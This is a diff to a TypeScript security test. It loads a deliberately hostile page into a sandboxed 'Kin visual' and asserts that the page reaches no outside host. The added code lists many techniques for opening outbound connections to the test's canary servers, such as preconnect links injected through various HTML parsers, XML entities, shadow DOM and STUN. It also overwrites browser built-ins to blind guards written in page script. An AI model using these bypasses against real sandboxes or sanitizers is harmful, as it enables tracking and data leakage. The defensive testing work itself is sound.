@@ -55,6 +55,30 @@ const hostilePage = (stun: string) => {
 <form id="form" action="${http}/form" method="post"><input name="a" value="b"></form>
 <script>
 var child = ${JSON.stringify(child)};
+var X = "http://www.w3.org/1999/xhtml";
+// Built at run time: the page's own script text is scrubbed too, so literal tags would not test the sinks.
+var L = "<" + "link", LU = "<" + "LINK", IF = "<" + "iframe";
+var shadows = [];
+// Any of these connected for a moment is enough: WebKit preconnects a <link> as it is inserted.
+function connectedNow() {
+  var all = "link,iframe,frame,object,embed", n = document.querySelectorAll(all).length;
+  shadows.forEach(function (root) { n += root.querySelectorAll(all).length; });
+  return n;
+}
+// Blind every built-in a guard written in page script might lean on, before trying anything.
+RegExp.prototype.exec = function () { return null; };
+RegExp.prototype.test = function () { return false; };
+String.prototype.toLowerCase = function () { return "x"; };
+String.prototype.indexOf = function () { return -1; };
+["localName", "tagName", "nodeName", "namespaceURI"].forEach(function (name) {
+  Object.defineProperty(Element.prototype, name, { configurable: true, get: function () { return "div"; } });
+});
+Object.defineProperty(MutationRecord.prototype, "addedNodes", { configurable: true, get: function () { return []; } });
+Node.prototype.removeChild = function (node) { return node; };
+Element.prototype.remove = function () {};
+Reflect.apply = function () {};
+Function.prototype.call = function () {};
+Function.prototype.apply = function () {};
 var attempts = [
   function () { ${rtc} },
   function () { new webkitRTCPeerConnection({iceServers:[{urls:"stun:${stun}"}]}); },
@@ -70,10 +94,10 @@ var attempts = [
   function () { var f = document.createElement("iframe"); f.src = "javascript:'" + child.replace(/'/g, "\\\\'") + "'"; document.body.appendChild(f); },
   function () { var f = document.createElement("iframe"); f.src = "data:text/html," + encodeURIComponent(child); document.body.appendChild(f); },
   function () { var f = document.createElement("iframe"); f.src = URL.createObjectURL(new Blob([child], { type: "text/html" })); document.body.appendChild(f); },
-  function () { var d = document.createElement("div"); d.innerHTML = '<iframe srcdoc="${childAttr}"></iframe>'; document.body.appendChild(d); },
-  function () { document.body.insertAdjacentHTML("beforeend", '<iframe srcdoc="${childAttr}"></iframe>'); },
-  function () { var t = document.createElement("template"); t.innerHTML = '<iframe srcdoc="${childAttr}"></iframe>'; document.body.appendChild(t.content.cloneNode(true)); },
-  function () { var x = new DOMParser().parseFromString('<html xmlns="http://www.w3.org/1999/xhtml"><body><iframe srcdoc="${childAttr}"/></body></html>', "application/xhtml+xml"); document.body.appendChild(document.adoptNode(x.getElementsByTagName("iframe")[0])); },
+  function () { var d = document.createElement("div"); d.innerHTML = IF + ' srcdoc="${childAttr}"></iframe>'; document.body.appendChild(d); },
+  function () { document.body.insertAdjacentHTML("beforeend", IF + ' srcdoc="${childAttr}"></iframe>'); },
+  function () { var t = document.createElement("template"); t.innerHTML = IF + ' srcdoc="${childAttr}"></iframe>'; document.body.appendChild(t.content.cloneNode(true)); },
+  function () { var x = new DOMParser().parseFromString('<html xmlns="http://www.w3.org/1999/xhtml"><body>' + IF + ' srcdoc="${childAttr}"/></body></html>', "application/xhtml+xml"); document.body.appendChild(document.adoptNode(x.getElementsByTagName("iframe")[0])); },
   function () { var f = document.createElement("iframe"); document.body.appendChild(f); var C = f.contentWindow.RTCPeerConnection; new C({iceServers:[{urls:"stun:${stun}"}]}); },
   function () { var o = document.createElement("object"); o.data = "data:text/html," + encodeURIComponent(child); document.body.appendChild(o); },
   function () { new Worker(URL.createObjectURL(new Blob(["fetch('${http}/blob-worker')"], { type: "text/javascript" }))); },
@@ -95,10 +119,33 @@ var attempts = [
   function () { var l = document.createElement("link"); l.rel = "preconnect"; l.href = "${http}"; document.head.appendChild(l); },
   function () { var l = document.createElement("link"); l.rel = "prefetch"; l.href = "${http}/prefetch-dynamic"; document.head.appendChild(l); },
   function () { var b = document.createElement("base"); b.href = "${http}/"; document.head.appendChild(b); new Image().src = "base-relative"; },
+  function () { var l = document.createElementNS(X, "h:link"); l.setAttribute("rel", "preconnect"); l.setAttribute("href", "${http}"); document.head.appendChild(l); },
+  function () { var d = document.createElement("div"); d.innerHTML = L + ' rel="pre&#99;onnect" href="${http}">'; document.body.appendChild(d); },
+  function () { document.body.insertAdjacentHTML("beforeend", LU + ' rel=preconnect href="${http}">'); },
+  function () { var d = document.createElement("div"); document.body.appendChild(d); d.outerHTML = L + ' rel="preconnect" href="${http}">'; },
+  function () { var t = document.createElement("template"); t.innerHTML = '<template>' + L + ' rel="preconnect" href="${http}"></template>'; document.body.appendChild(t.content.firstChild.content.cloneNode(true)); },
+  function () { var d = new DOMParser().parseFromString(L + ' rel="preconnect" href="${http}">', "text/html"); var l = d.querySelector("link"); if (l) document.head.appendChild(document.adoptNode(l)); },
+  function () { var d = new DOMParser().parseFromString('<!DOCTYPE r [<!ENTITY e "&#60;link xmlns=&#34;' + X + '&#34; rel=&#34;preconnect&#34; href=&#34;${http}&#34;/&#62;">]><r>&e;</r>', "application/xml"); var l = d.getElementsByTagNameNS(X, "link")[0]; if (l) document.head.appendChild(document.adoptNode(l)); },
+  function () { var l = document.implementation.createDocument(X, "link", null).documentElement; l.setAttribute("rel", "preconnect"); l.setAttribute("href", "${http}"); document.head.appendChild(document.adoptNode(l)); },
+  function () { document.head.appendChild(document.createRange().createContextualFragment(L + ' rel="preconnect" href="${http}">')); },
+  function () { var d = document.createElement("div"); d.setHTMLUnsafe(L + ' rel="preconnect" href="${http}">' + IF + ' srcdoc="${childAttr}"></iframe>'); document.body.appendChild(d); },
+  function () { var l = Document.parseHTMLUnsafe(L + ' rel="preconnect" href="${http}">').querySelector("link"); if (l) document.head.appendChild(document.adoptNode(l)); },
+  function () { document.write(L + ' rel="preconnect" href="${http}">' + IF + ' srcdoc="${childAttr}"></iframe>'); },
+  function () { var d = document.createElement("div"); d.contentEditable = "true"; document.body.appendChild(d); d.focus(); document.execCommand("insertHTML", false, L + ' rel="preconnect" href="${http}">'); },
+  function () { customElements.define("kin-l", class extends HTMLLinkElement {}, { extends: "link" }); var l = new (customElements.get("kin-l"))(); l.rel = "preconnect"; l.href = "${http}"; document.head.appendChild(l); },
+  function () { var n = 0; customElements.define("kin-m", class extends HTMLLinkElement {}, { get extends() { return n++ ? "link" : "p"; } }); var l = new (customElements.get("kin-m"))(); l.rel = "preconnect"; l.href = "${http}"; document.head.appendChild(l); },
+  function () { new XSLTProcessor(); },
+  function () { var d = document.createElement("div"); d.innerHTML = '<noscript><p title="</noscript>' + L + ' rel=preconnect href=${http}>"></p></noscript>'; document.body.appendChild(d); },
+  function () { var h = document.createElement("div"); document.body.appendChild(h); var root = h.attachShadow({ mode: "open" }); shadows.push(root); root.innerHTML = L + ' rel="preconnect" href="${http}">' + IF + ' srcdoc="${childAttr}"></iframe>'; },
+  function () { var d = document.createElement("div"); document.body.appendChild(d); d.setHTML(L + ' rel="preconnect" href="${http}">'); },
 ];
-attempts.forEach(function (attempt) { try { attempt(); } catch (error) {} });
+var connected = connectedNow() ? ["start"] : [];
+attempts.forEach(function (attempt, index) {
+  try { attempt(); } catch (error) {}
+  if (connectedNow()) connected.push(index);
+});
 // The page reached its last line and still loads from its own host.
-new Image().src = new URL("/attempted", location.href).href;
+new Image().src = new URL("/attempted?connected=" + connected.join(","), location.href).href;
 // Navigating ends the page, so these go last, once STUN has had its chance in the control.
 setTimeout(function () {
   try { document.getElementById("form").submit(); } catch (error) {}
@@ -153,12 +200,14 @@ const canaries = Effect.acquireRelease(
 );
 
 /** Serves the visual as the asset route does: the page only to a frame's own request. */
-const visualHost = (page: string, sealed: boolean, attempted: Deferred.Deferred<void>) =>
+const visualHost = (page: string, sealed: boolean, attempted: Deferred.Deferred<string>) =>
   Effect.acquireRelease(
     Effect.callback<{ readonly origin: string; readonly server: NodeHttp.Server }>((resume) => {
       const server = NodeHttp.createServer((request, response) => {
         const url = new URL(request.url ?? "/", "http://kin.test");
-        if (url.pathname === "/attempted") Deferred.doneUnsafe(attempted, Effect.void);
+        if (url.pathname === "/attempted") {
+          Deferred.doneUnsafe(attempted, Effect.succeed(url.searchParams.get("connected") ?? ""));
+        }
         if (url.pathname !== "/visual") {
           response.writeHead(200, { "content-type": "image/gif" }).end();
           return;
@@ -209,7 +258,7 @@ const openVisual = Effect.fn("test.openVisual")(function* (
   directory: string,
 ) {
   const canary = yield* canaries;
-  const attempted = yield* Deferred.make<void>();
+  const attempted = yield* Deferred.make<string>();
   // The control is the raw page, as a coding thread serves it: no prelude, no Kin policy.
   const page = hostilePage(canary.stun);
   const host = yield* visualHost(sealed ? kinVisualPageDocument(page) : page, sealed, attempted);
@@ -217,8 +266,9 @@ const openVisual = Effect.fn("test.openVisual")(function* (
   const browser = yield* launch(executable, canary.tcpPort, netLog);
   const tab = yield* Effect.promise(() => browser.newPage());
   yield* Effect.promise(() => tab.goto(`${host.origin}/visual`));
-  yield* Deferred.await(attempted);
-  return { canary, browser, netLog, page: tab };
+  /** Attempts after which a `<link>` or frame element was in the document, even for a moment. */
+  const connected = yield* Deferred.await(attempted);
+  return { canary, browser, netLog, page: tab, connected };
 });
 
 it.live("a hostile page in a Kin visual reaches nothing off its own host", (ctx) =>
@@ -246,6 +296,8 @@ it.live("a hostile page in a Kin visual reaches nothing off its own host", (ctx)
     yield* Effect.promise(() => open.browser.close());
 
     assert.deepStrictEqual(sealed.canary.reached, []);
+    assert.strictEqual(sealed.connected, "");
+    assert.notStrictEqual(open.connected, "");
     // The browser's own resolver log: the sealed page never even looked an outside name up.
     assert.notInclude(NodeFS.readFileSync(sealed.netLog, "utf8"), OUTSIDE);
     assert.include(NodeFS.readFileSync(open.netLog, "utf8"), OUTSIDE);
